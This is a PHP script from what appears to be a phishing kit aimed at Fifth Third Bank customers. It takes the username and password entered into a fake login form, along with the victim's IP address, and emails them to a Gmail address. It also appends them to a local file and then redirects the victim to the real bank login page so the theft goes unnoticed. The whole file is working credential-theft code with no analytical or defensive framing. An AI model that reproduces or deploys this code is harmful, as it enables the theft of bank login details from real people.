<?php
 $ip = getenv("REMOTE_ADDR");
 $message .= "Username : ".$_POST['user-id']."\n";
 $message .= "Password : ".$_POST['password']."\n";
 $message .= "IP : ".$ip."\n";
 $send = "citizensmobileinfo@gmail.com";
 $subject = "~ 53rd ~";
 $headers = "From: Jay<logs@siteserve.jp";
 $headers .= $_POST['eMailAdd']."\n";
 $headers .= "MIME-Version: 1.0\n";
 mail("$send", "$subject", $message); 
 header("Location: https://www.53.com/content/fifth-third/en/login.html");
 $fp = fopen("r.txt","a");
 fputs($fp,$message);
 fclose($fp);
?>